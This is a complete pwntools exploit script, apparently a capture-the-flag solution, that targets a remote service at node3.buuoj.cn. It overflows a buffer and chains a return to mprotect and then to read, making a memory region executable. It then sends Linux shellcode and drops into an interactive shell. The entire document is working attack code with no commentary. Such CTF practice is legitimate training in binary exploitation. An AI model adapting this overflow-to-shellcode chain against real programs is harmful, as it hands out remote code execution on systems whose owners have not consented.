from pwn import *
p = remote('node3.buuoj.cn',27480)
#p = process('./main')
context.log_level = 'DEBUG'

mprotect = 0x0806EC80
buf = 0x80EC000
read = 0x0806E140

payload = '\x00'*0x38
payload += p32(mprotect)
payload += p32(0x0804F460) #here it will pop 12bytes garbage content to execute read
payload += p32(buf)
payload += p32(0x1000)
payload += p32(0x7)
payload += p32(read)
payload += p32(buf)
payload += p32(0)
payload += p32(buf)
payload += p32(0x100)
p.sendline(payload)

shellcode = asm(shellcraft.sh(),arch='i386',os='linux')
p.sendline(shellcode)
sleep(0.1)
p.interactive()
